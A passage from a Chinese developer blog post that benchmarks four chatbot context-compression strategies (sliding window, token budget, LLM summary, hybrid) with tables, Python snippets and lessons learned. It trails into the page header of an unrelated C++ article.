</code></pre>
<h4 data-id="heading-92"><strong>实测数据</strong></h4>
<p><strong>长对话（20轮，560 tokens）：</strong></p>






























<table><thead><tr><th>策略</th><th>Token</th><th>相对滑动窗口</th></tr></thead><tbody><tr><td>滑动窗口</td><td><strong>145</strong></td><td>基准</td></tr><tr><td>Token动态</td><td>193</td><td>+33%</td></tr><tr><td>LLM摘要</td><td>597</td><td>+312% ❌</td></tr><tr><td><strong>混合策略</strong></td><td><strong>604</strong></td><td><strong>+317%</strong> ❌</td></tr></tbody></table>
<p><strong>混合策略居然比LLM摘要还差！</strong></p>
<hr/>
<h4 data-id="heading-93"><strong>为什么会这样？</strong></h4>
<p><strong>原因：混合策略保留了更多最近消息</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># LLM摘要配置</span>
keep_recent_turns = <span class="hljs-number">3</span>  <span class="hljs-comment"># 保留3轮 = 6条消息</span>

<span class="hljs-comment"># 混合策略配置</span>
keep_recent_turns = <span class="hljs-number">5</span>  <span class="hljs-comment"># 保留5轮 = 10条消息</span>

结果：
- LLM摘要：<span class="hljs-number">1</span>条摘要 + <span class="hljs-number">6</span>条消息 = <span class="hljs-number">7</span>条（<span class="hljs-number">597</span> tokens）
- 混合策略：<span class="hljs-number">1</span>条摘要 + <span class="hljs-number">10</span>条消息 = <span class="hljs-number">11</span>条（<span class="hljs-number">604</span> tokens）
</code></pre>
<p><strong>对比滑动窗口：</strong></p>
<pre><code class="hljs">滑动窗口：10条最新消息 = 145 tokens
混合策略：1摘要 + 10条 = 604 tokens

Token差距：4.2倍！
</code></pre>
<hr/>
<h4 data-id="heading-94"><strong>深层原因：摘要本身就很"胖"</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">摘要示例（<span class="hljs-number">200</span>+ tokens）：
<span class="hljs-string">"📝 对话历史摘要：
用户Tom，28岁，在上海浦东工作，
是AI工程师，目前研究Agent多智能体协作，
关注通信延迟和消息队列优化..."</span>

vs 原始对话（<span class="hljs-number">100</span> tokens）：
<span class="hljs-string">"我叫Tom"</span>
<span class="hljs-string">"我在上海"</span>
<span class="hljs-string">"我是AI工程师"</span>
<span class="hljs-string">"我在研究Agent"</span>
...

结果：摘要<span class="hljs-number">200</span> tokens &gt; 原始<span class="hljs-number">100</span> tokens
</code></pre>
<hr/>
<h4 data-id="heading-95"><strong>教训</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">❌ 错误想法：混合策略综合优点 → 一定最好
✅ 正确认知：综合策略可能综合了缺点

启示：
• 混合策略牺牲Token效率，换取信息保留
• 如果追求Token最少 → 用滑动窗口
• 如果追求信息保留 → 用混合策略
• 不存在<span class="hljs-string">"两全其美"</span>
</code></pre>
<hr/>
<h3 data-id="heading-96"><strong>4.3 意外3：Token动态"精确控制"是把双刃剑</strong></h3>
<h4 data-id="heading-97"><strong>直觉预期</strong></h4>
<pre><code class="hljs">精确控制Token → 充分利用预算
预算200 → 实际193
→ 应该比滑动窗口更高效
</code></pre>
<h4 data-id="heading-98"><strong>实测数据</strong></h4>
<p><strong>中等对话（10轮，249 tokens）：</strong></p>




















<table><thead><tr><th>策略</th><th>Token</th><th>消息数</th></tr></thead><tbody><tr><td>滑动窗口</td><td><strong>123</strong></td><td>10条</td></tr><tr><td>Token动态(预算200)</td><td>194</td><td>15条</td></tr></tbody></table>
<p><strong>Token动态反而多用58%！</strong></p>
<hr/>
<h4 data-id="heading-99"><strong>为什么会这样？</strong></h4>
<p><strong>滑动窗口："省着用"</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 固定保留10条（5轮）</span>
<span class="hljs-comment"># 不管还有多少预算</span>
messages[-<span class="hljs-number">10</span>:]  <span class="hljs-comment"># 123 tokens</span>

剩余预算：<span class="hljs-number">200</span> - <span class="hljs-number">123</span> = <span class="hljs-number">77</span> tokens（浪费）
</code></pre>
<p><strong>Token动态："用满预算"</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 尽量用满200预算</span>
<span class="hljs-comment"># 从后往前累加到接近200</span>
messages[-<span class="hljs-number">15</span>:]  <span class="hljs-comment"># 194 tokens</span>

剩余预算：<span class="hljs-number">200</span> - <span class="hljs-number">194</span> = <span class="hljs-number">6</span> tokens（充分利用）
</code></pre>
<hr/>
<h4 data-id="heading-100"><strong>看似合理，实则矛盾</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">Token动态的<span class="hljs-string">"优势"</span>：
✅ 充分利用预算（<span class="hljs-number">194</span>/<span class="hljs-number">200</span> = <span class="hljs-number">97</span><span class="hljs-comment">%利用率）</span>
✅ 保留更多消息（<span class="hljs-number">15</span>条 vs <span class="hljs-number">10</span>条）

但从另一个角度：
❌ 用更多Token（<span class="hljs-number">194</span> vs <span class="hljs-number">123</span>）
❌ 后续对话成本更高

问题：
<span class="hljs-string">"充分利用预算"</span>到底是优势还是劣势？
</code></pre>
<p><strong>答案：看你的目标！</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">如果目标是<span class="hljs-string">"充分利用4K上下文窗口"</span>：
→ Token动态是优势 ✅

如果目标是<span class="hljs-string">"尽量节省Token成本"</span>：
→ Token动态是劣势 ❌
</code></pre>
<hr/>
<h4 data-id="heading-101"><strong>教训</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">❌ 错误想法：精确控制 = 更好
✅ 正确认知：精确控制是工具，不是目标

启示：
• 明确目标：节省成本 <span class="hljs-keyword">or</span> 充分利用？
• Token动态适合<span class="hljs-string">"必须用满预算"</span>的场景
• 如果追求极致压缩 → 用滑动窗口
</code></pre>
<hr/>
<h3 data-id="heading-102"><strong>4.4 意外4：List vs Deque的性能差异微乎其微</strong></h3>
<h4 data-id="heading-103"><strong>直觉预期</strong></h4>
<pre><code class="hljs language-scss" lang="scss">计算机科学理论：
- List<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>) = <span class="hljs-built_in">O</span>(n)
- Deque<span class="hljs-selector-class">.popleft</span>() = <span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)

Deque应该快很多！
</code></pre>
<h4 data-id="heading-104"><strong>实测数据</strong></h4>
<p><strong>100,000次操作：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">List:  13.63ms  (0.14μs/次)</span>
<span class="hljs-section">Deque: 12.52ms  (0.13μs/次)</span>

速度差异：8%
</code></pre>
<p><strong>震惊：几乎一样快！</strong></p>
<hr/>
<h4 data-id="heading-105"><strong>为什么会这样？</strong></h4>
<p><strong>原因1：操作次数少</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 实际使用</span>
messages.pop(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 只删1条</span>

<span class="hljs-comment"># 不是</span>
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
    messages.pop(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 删1000条</span>
</code></pre>
<p>单次删除，O(n)和O(1)差异不大。</p>
<p><strong>原因2：消息列表不长</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 实际场景</span>
messages = [...]  <span class="hljs-comment"># 10-20条</span>

<span class="hljs-comment"># 不是</span>
messages = [...]  <span class="hljs-comment"># 10,000条</span>
</code></pre>
<p>n很小时，O(n)≈O(1)。</p>
<p><strong>原因3：Python内部优化</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># CPython对list.pop(0)有优化</span>
<span class="hljs-comment"># 不是naive的内存移动</span>
</code></pre>
<hr/>
<h4 data-id="heading-106"><strong>教训</strong></h4>
<pre><code class="hljs language-scss" lang="scss">❌ 错误想法：理论复杂度 = 实际性能
✅ 正确认知：要测试实际场景

启示：
• 不要过早优化
• 小数据量时，<span class="hljs-built_in">O</span>(n)和<span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)差异不大
• 理论是指导，实测才是真相
• List够用，不需要Deque
</code></pre>
<hr/>
<h3 data-id="heading-107"><strong>4.5 意外5："更智能"不等于"更好"</strong></h3>
<h4 data-id="heading-108"><strong>直觉预期</strong></h4>
<pre><code class="hljs">智能排序：
LLM摘要 &gt; 混合策略 &gt; Token动态 &gt; 滑动窗口

实际效果应该也是这个顺序
</code></pre>
<h4 data-id="heading-109"><strong>实测数据汇总</strong></h4>








































<table><thead><tr><th>维度</th><th>第1名</th><th>第2名</th><th>第3名</th><th>第4名</th></tr></thead><tbody><tr><td><strong>Token效率</strong></td><td>滑动窗口</td><td>Token动态</td><td>混合策略</td><td>LLM摘要</td></tr><tr><td><strong>速度</strong></td><td>滑动窗口</td><td>Token动态</td><td>混合策略</td><td>LLM摘要</td></tr><tr><td><strong>成本</strong></td><td>滑动窗口</td><td>Token动态</td><td>混合策略</td><td>LLM摘要</td></tr><tr><td><strong>简单性</strong></td><td>滑动窗口</td><td>Token动态</td><td>LLM摘要</td><td>混合策略</td></tr></tbody></table>
<p><strong>最"蠢"的策略（滑动窗口）在4个维度都第一！</strong></p>
<p><strong>只有"信息保留"一个维度：</strong></p>



















<table><thead><tr><th>维度</th><th>第1名</th><th>第2名</th><th>第3名</th><th>第4名</th></tr></thead><tbody><tr><td><strong>信息保留</strong></td><td>LLM摘要</td><td>混合策略</td><td>Token动态</td><td>滑动窗口</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-110"><strong>为什么会这样？</strong></h4>
<p><strong>复杂度诅咒：</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 简单 → 快</span>
<span class="hljs-deletion">- 简单 → 省Token</span>
<span class="hljs-deletion">- 简单 → 便宜</span>
<span class="hljs-deletion">- 简单 → 可靠</span>

LLM摘要：
<span class="hljs-deletion">- 复杂 → 慢</span>
<span class="hljs-deletion">- 复杂 → 费Token</span>
<span class="hljs-deletion">- 复杂 → 贵</span>
<span class="hljs-deletion">- 复杂 → 可能出错</span>
</code></pre>
<p><strong>智能的代价：</strong></p>
<pre><code class="hljs language-diff" lang="diff">获得：100%信息保留
付出：
<span class="hljs-deletion">- 速度慢29,000倍</span>
<span class="hljs-deletion">- Token多4倍</span>
<span class="hljs-deletion">- 成本$0.0001/次</span>
<span class="hljs-deletion">- 系统复杂度↑</span>

问题：这个trade-off值得吗？
</code></pre>
<p><strong>答案：看场景</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">短对话（<span class="hljs-number">80</span><span class="hljs-comment">%场景）：</span>
→ 不值得，信息本来就不会丢

长对话（<span class="hljs-number">20</span><span class="hljs-comment">%场景）：</span>
→ 值得，用户体验提升明显
</code></pre>
<hr/>
<h4 data-id="heading-111"><strong>教训</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">❌ 错误想法：智能 = 好
✅ 正确认知：简单 = 好（大多数场景）

启示：
• <span class="hljs-number">80</span><span class="hljs-comment">%场景用滑动窗口就够了</span>
• <span class="hljs-number">20</span><span class="hljs-comment">%场景才需要"智能"策略</span>
• 不要为了<span class="hljs-string">"智能"</span>而牺牲效率
• Keep It Simple, Stupid (KISS原则)
</code></pre>
<hr/>
<h3 data-id="heading-112"><strong>4.6 最震撼的发现：上下文越长，效率越低</strong></h3>
<h4 data-id="heading-113"><strong>实测数据</strong></h4>



































<table><thead><tr><th>对话长度</th><th>滑动窗口Token</th><th>Token动态Token</th><th>比例</th></tr></thead><tbody><tr><td>5轮(126)</td><td>126</td><td>126</td><td>1.0x</td></tr><tr><td>10轮(249)</td><td>123</td><td>194</td><td>1.6x</td></tr><tr><td>20轮(560)</td><td>145</td><td>193</td><td>1.3x</td></tr><tr><td>30轮(933)</td><td>144</td><td>191</td><td>1.3x</td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">对话越长：
<span class="hljs-deletion">- 绝对Token数差异不大（144-145 vs 191-193）</span>
<span class="hljs-deletion">- 但滑动窗口压缩率越高（85% vs 80%）</span>
<span class="hljs-deletion">- Token动态优势消失</span>
</code></pre>
<p><strong>矛盾之处：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">Token动态设计目标：长对话时充分利用预算
实际结果：长对话时优势反而不明显

滑动窗口设计目标：简单固定保留
实际结果：长对话时压缩效果最好（<span class="hljs-number">85</span><span class="hljs-comment">%）</span>
</code></pre>
<hr/>
<h4 data-id="heading-114"><strong>为什么会这样？</strong></h4>
<p><strong>滑动窗口的"顿悟时刻"：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang"><span class="hljs-number">5</span>轮 → <span class="hljs-number">10</span>轮：新增<span class="hljs-number">5</span>轮，需要压缩
压缩率：<span class="hljs-number">0</span><span class="hljs-comment">% → 51%</span>

<span class="hljs-number">10</span>轮 → <span class="hljs-number">20</span>轮：新增<span class="hljs-number">10</span>轮，需要大量压缩
压缩率：<span class="hljs-number">51</span><span class="hljs-comment">% → 74%</span>

<span class="hljs-number">20</span>轮 → <span class="hljs-number">30</span>轮：新增<span class="hljs-number">10</span>轮，继续压缩
压缩率：<span class="hljs-number">74</span><span class="hljs-comment">% → 85%</span>

结论：对话越长，滑动窗口压缩效率越高
</code></pre>
<p><strong>Token动态的"天花板"：</strong></p>
<pre><code class="hljs language-diff" lang="diff">预算200固定：
<span class="hljs-deletion">- 10轮(249) → 194 tokens（少55）</span>
<span class="hljs-deletion">- 20轮(560) → 193 tokens（少367）</span>
<span class="hljs-deletion">- 30轮(933) → 191 tokens（少742）</span>

绝对压缩量：55 → 367 → 742 ↑
压缩率：22% → 66% → 80% ↑

但始终被"200预算"限制
</code></pre>
<p><strong>结论：预算是Token动态的天花板</strong></p>
<hr/>
<h4 data-id="heading-115"><strong>教训</strong></h4>
<pre><code class="hljs">❌ 错误想法：复杂场景需要复杂方案
✅ 正确认知：简单方案对付复杂场景可能更有效

启示：
• 对话越长，滑动窗口优势越大
• Token动态受预算天花板限制
• 不要低估简单方案的潜力
</code></pre>
<hr/>
<h3 data-id="heading-116"><strong>4.7 核心教训：Trade-off无处不在</strong></h3>
<p>通过完整测试，我们发现：<strong>不存在"完美"的策略。</strong></p>
<h4 data-id="heading-117"><strong>四个核心Trade-off</strong></h4>
<p><strong>1. Token效率 ↔ 信息保留</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- Token最少（145）</span>
<span class="hljs-deletion">- 信息保留0%</span>

LLM摘要：
<span class="hljs-deletion">- Token很多（597）</span>
<span class="hljs-deletion">- 信息保留100%</span>

无法同时优化
</code></pre>
<hr/>
<p><strong>2. 速度 ↔ 智能</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 速度最快（0.00ms）</span>
<span class="hljs-deletion">- 不智能（机械删除）</span>

LLM摘要：
<span class="hljs-deletion">- 速度最慢（11,000ms）</span>
<span class="hljs-deletion">- 最智能（理解语义）</span>

无法同时优化
</code></pre>
<hr/>
<p><strong>3. 成本 ↔ 质量</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 零成本</span>
<span class="hljs-deletion">- 可能丢失信息</span>

LLM摘要：
<span class="hljs-deletion">- 有成本（$0.0001/次）</span>
<span class="hljs-deletion">- 保留完整信息</span>

无法同时优化
</code></pre>
<hr/>
<p><strong>4. 简单 ↔ 灵活</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 极简（3行代码）</span>
<span class="hljs-deletion">- 不灵活（固定轮数）</span>

混合策略：
<span class="hljs-deletion">- 复杂（50行代码）</span>
<span class="hljs-deletion">- 灵活（自动适应）</span>

无法同时优化
</code></pre>
<hr/>
<h4 data-id="heading-118"><strong>工程中的智慧</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">理想主义者：
<span class="hljs-string">"我要一个策略，Token少、速度快、成本低、
 信息保留好、还简单易用！"</span>

现实：
<span class="hljs-string">"不存在这样的策略。"</span>

工程师的选择：
<span class="hljs-string">"我要在Token效率和信息保留之间找平衡。"</span>
→ 选择混合策略

<span class="hljs-string">"我要在速度和成本之间找平衡。"</span>
→ 选择滑动窗口

<span class="hljs-string">"我要在简单和灵活之间找平衡。"</span>
→ 选择Token动态
</code></pre>
<hr/>
<h3 data-id="heading-119"><strong>4.8 反直觉结论总结</strong></h3>



































<table><thead><tr><th>直觉想法</th><th>实测结果</th><th>原因</th></tr></thead><tbody><tr><td>LLM摘要效率最高</td><td>短对话反而更差</td><td>格式开销+LLM啰嗦</td></tr><tr><td>混合策略综合优点</td><td>长对话Token多4倍</td><td>摘要本身很"胖"</td></tr><tr><td>Token动态更节省</td><td>比滑动窗口多58%</td><td>尽量用满预算</td></tr><tr><td>Deque比List快很多</td><td>只快8%</td><td>实际操作次数少</td></tr><tr><td>智能策略更好</td><td>滑动窗口多维度第一</td><td>简单=快=省=可靠</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-120"><strong>4.9 最终建议：从简单开始</strong></h3>
<p>基于所有测试数据，我们的<strong>最终建议</strong>：</p>
<h4 data-id="heading-121"><strong>第一阶段：用滑动窗口（80%场景）</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 最简单的方案</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)

优点：
✅ <span class="hljs-number">3</span>行代码
✅ 零成本
✅ 最快
✅ Token最少
✅ 可靠

适用：
• 短对话（≤<span class="hljs-number">10</span>轮）
• 成本敏感
• 实时场景
• 初期MVP
</code></pre>
<hr/>
<h4 data-id="heading-122"><strong>第二阶段：发现问题后升级</strong></h4>
<p><strong>观察指标：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 用户是否抱怨"不记得之前说的"？
<span class="hljs-bullet">2.</span> 对话是否经常超过10轮？
<span class="hljs-bullet">3.</span> 是否有关键信息丢失？
<span class="hljs-bullet">4.</span> 用户是否需要重复信息？
</code></pre>
<p><strong>如果是，考虑升级到混合策略：</strong></p>
<pre><code class="hljs language-python" lang="python">compressor = HybridCompressor(
    llm,
    threshold_turns=<span class="hljs-number">10</span>,
    keep_recent_turns=<span class="hljs-number">5</span>
)

优点：
✅ 短对话保持滑动窗口速度
✅ 长对话保留用户信息
✅ 自动适应

缺点：
❌ 长对话Token多<span class="hljs-number">4</span>倍
❌ 有成本
❌ 速度慢（长对话时）
</code></pre>
<hr/>
<h4 data-id="heading-123"><strong>第三阶段：特殊场景使用专用策略</strong></h4>
<p><strong>场景1：有Token严格限制</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 用Token动态</span>
compressor = TokenBasedCompressor(
    llm.count_tokens,
    max_tokens=<span class="hljs-number">200</span>
)
</code></pre>
<p><strong>场景2：超长对话（≥30轮）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 用LLM摘要</span>
compressor = LLMSummaryCompressor(
    llm,
    keep_recent_turns=<span class="hljs-number">3</span>
)
</code></pre>
<h2 data-id="heading-124"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5287175b78ce44a2875ec6c1e15ca357~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=D0DQJPG1rLkPwRWnYjuxTdIOzHQ%3D" alt="image.png" loading="lazy"/></h2>
<h3 data-id="heading-125"><strong>4.10 写在最后：测试的价值</strong></h3>
<p>如果我们没有做这些测试，会有什么后果？</p>
<p><strong>可能的错误决策：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">❌ <span class="hljs-string">"LLM摘要最智能，全部用它！"</span>
   → 短对话Token增加<span class="hljs-number">141</span><span class="hljs-comment">%，成本暴涨</span>

❌ <span class="hljs-string">"混合策略综合优点，就用它！"</span>
   → 没意识到Token多<span class="hljs-number">4</span>倍，成本超预算

❌ <span class="hljs-string">"Token动态精确控制，最优！"</span>
   → 没意识到比滑动窗口多用<span class="hljs-number">58</span><span class="hljs-comment">% Token</span>

❌ <span class="hljs-string">"Deque比List快，必须用Deque！"</span>
   → 花时间重构，实际只快<span class="hljs-number">8</span><span class="hljs-comment">%</span>
</code></pre>
<p><strong>测试的价值：</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">✅ 避免基于<span class="hljs-string">"直觉"</span>的错误决策
✅ 发现反直觉的真相
✅ 量化Trade-<span class="hljs-keyword">off</span>
✅ 找到适合场景的最优解
</code></pre>
<hr/>
<h3 data-id="heading-126"><strong>4.11 关键数据速查表</strong></h3>
<p>为了方便查阅，这里汇总所有关键测试数据：</p>
<h4 data-id="heading-127"><strong>压缩效率（长对话20轮，560 tokens）</strong></h4>













































<table><thead><tr><th>策略</th><th>Token</th><th>压缩率</th><th>速度</th><th>成本</th><th>信息保留</th></tr></thead><tbody><tr><td>滑动窗口</td><td>145</td><td>74%</td><td>0.00ms</td><td>$0</td><td>0%</td></tr><tr><td>Token动态</td><td>193</td><td>66%</td><td>0.53ms</td><td>$0</td><td>依赖预算</td></tr><tr><td>LLM摘要</td><td>597</td><td>-7%</td><td>13,446ms</td><td>$0.0001</td><td>100%</td></tr><tr><td>混合策略</td><td>604</td><td>-8%</td><td>11,663ms</td><td>$0.0001</td><td>100%</td></tr></tbody></table>
<h4 data-id="heading-128"><strong>适用场景快速匹配</strong></h4>













































<table><thead><tr><th>场景特征</th><th>推荐策略</th><th>核心原因</th></tr></thead><tbody><tr><td>对话≤10轮</td><td>滑动窗口</td><td>简单够用</td></tr><tr><td>对话10-30轮</td><td>混合策略</td><td>自动适应</td></tr><tr><td>对话≥30轮</td><td>LLM摘要</td><td>唯一正收益</td></tr><tr><td>Token限制严格</td><td>Token动态</td><td>精确控制</td></tr><tr><td>成本敏感</td><td>滑动窗口</td><td>零成本</td></tr><tr><td>实时要求</td><td>滑动窗口</td><td>最快</td></tr><tr><td>必须记住用户</td><td>混合策略/LLM</td><td>信息保留</td></tr></tbody></table>
<h4 data-id="heading-129"><strong>性能基准</strong></h4>
<pre><code class="hljs language-diff" lang="diff">速度基准（20轮对话）：
<span class="hljs-deletion">- 滑动窗口: 0.00ms    ← 最快</span>
<span class="hljs-deletion">- Token动态: 0.53ms    ← 可接受</span>
<span class="hljs-deletion">- LLM摘要:  11,663ms   ← 慢22,000倍</span>

Token基准（20轮对话）：
<span class="hljs-deletion">- 滑动窗口: 145 tokens  ← 最少</span>
<span class="hljs-deletion">- Token动态: 193 tokens ← +33%</span>
<span class="hljs-deletion">- LLM摘要:  597 tokens  ← +312%</span>

成本基准（100次压缩）：
<span class="hljs-deletion">- 滑动窗口: $0         ← 免费</span>
<span class="hljs-deletion">- Token动态: $0         ← 免费</span>
<span class="hljs-deletion">- 混合策略:  $0.008     ← 看场景</span>
<span class="hljs-deletion">- LLM摘要:  $0.01       ← 最贵</span>
</code></pre>
<hr/>
<h3 data-id="heading-130"><strong>4.12 小结：测试改变了什么</strong></h3>
<p><strong>测试前的想法：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> LLM摘要应该是最好的（智能嘛）
<span class="hljs-bullet">2.</span> 混合策略综合优点，应该无敌
<span class="hljs-bullet">3.</span> Token动态精确控制，应该最省
<span class="hljs-bullet">4.</span> Deque比List快很多，必须用
</code></pre>
<p><strong>测试后的认知：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> LLM摘要短对话是负优化 ❌
<span class="hljs-bullet">2.</span> 混合策略长对话Token多4倍 ❌
<span class="hljs-bullet">3.</span> Token动态可能比滑动窗口多58% ❌
<span class="hljs-bullet">4.</span> Deque只快8%，差异微乎其微 ❌
</code></pre>
<p><strong>最重要的领悟：</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">✅ 没有<span class="hljs-string">"最好"</span>的策略
✅ 只有<span class="hljs-string">"最适合"</span>的策略
✅ 简单方案往往是最优解
✅ Trade-<span class="hljs-keyword">off</span>无处不在
✅ 测试胜过直觉
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e09910705d441bb819aaf395055db30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=CRhlK%2BAiTVvMWYrPi%2F01uslRW28%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-131"><strong>五、总结与展望</strong></h2>
<h3 data-id="heading-132"><strong>5.1 核心收获</strong></h3>
<p>通过这次完整的实战，我们得到了以下关键认知：</p>
<p><strong>1. 没有"完美"的策略</strong></p>
<ul>
<li>滑动窗口：最快、最省、最简单，但会丢信息</li>
<li>LLM摘要：保留信息，但慢且贵</li>
<li>混合策略：自动适应，但复杂</li>
<li>Token动态：精确控制，但可能用更多Token</li>
</ul>
<p><strong>2. 简单往往是最优解</strong></p>
<ul>
<li>80%场景：滑动窗口就够了</li>
<li>20%场景：才需要"智能"策略</li>
<li>过度优化反而降低效率</li>
</ul>
<p><strong>3. 测试胜过直觉</strong></p>
<ul>
<li>5个反直觉发现</li>
<li>避免了4个错误决策</li>
<li>节省了大量成本</li>
</ul>
<h3 data-id="heading-133"><strong>5.2 实战成果</strong></h3>
<p>完整的代码已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<p><strong>包含：</strong></p>
<ul>
<li>✅ 4种压缩策略的完整实现</li>
<li>✅ 真实的性能测试代码</li>
<li>✅ 详细的测试数据</li>
<li>✅ 可直接运行的示例</li>
</ul>
<p><strong>Star和Fork支持！</strong> ⭐</p>
<h3 data-id="heading-134"><strong>5.3 后续计划</strong></h3>
<p>记忆系统还有很多待探索的方向：</p>
<p><strong>系列文章第二篇：中期记忆架构</strong></p>
<ul>
<li>Redis缓存设计</li>
<li>PostgreSQL持久化</li>
<li>向量检索优化</li>
<li>生产环境部署</li>
</ul>
<p><strong>系列文章第三篇：长期记忆</strong></p>
<ul>
<li>知识图谱</li>
<li>语义检索</li>
<li>个性化推荐</li>
</ul>
<p><strong>敬请期待！</strong></p>
<hr/>
<p>如果这篇文章对你有帮助，欢迎：</p>
<ul>
<li>🌟 给GitHub项目点个Star</li>
<li>👍 点赞支持</li>
<li>💬 留言讨论</li>
<li>🔄 分享给更多人</li>
</ul>
<p>感谢阅读！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[8. 定制new和delete]]></title>    <link>https://juejin.cn/post/7579871631096135706</link>    <guid>https://juejin.cn/post/7579871631096135706</guid>    <pubDate>2025-12-04T16:48:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579871631096135706" data-draft-id="7579512734296309798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="8. 定制new和delete"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-12-04T16:48:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序猿本员"/> <meta itemprop="url" content="https://juejin.cn/user/3868510676597259"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            8. 定制new和delete
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3868510676597259/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序猿本员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:48:37.000Z" title="Thu Dec 04 2025 16:48:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
